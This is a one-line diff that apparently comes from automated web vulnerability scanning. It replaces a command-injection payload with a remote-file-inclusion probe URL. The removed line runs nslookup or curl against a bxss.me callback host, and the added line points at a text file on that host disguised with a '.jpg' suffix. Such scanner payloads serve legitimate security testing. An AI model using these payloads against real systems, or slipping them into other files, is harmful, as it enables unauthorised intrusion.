@@ -1,1 +1,1 @@
-`(nslookup -q=cname hithuyqxdrpyde3e97.bxss.me||curl hithuyqxdrpyde3e97.bxss.me)`
+http://bxss.me/t/fit.txt?.jpg
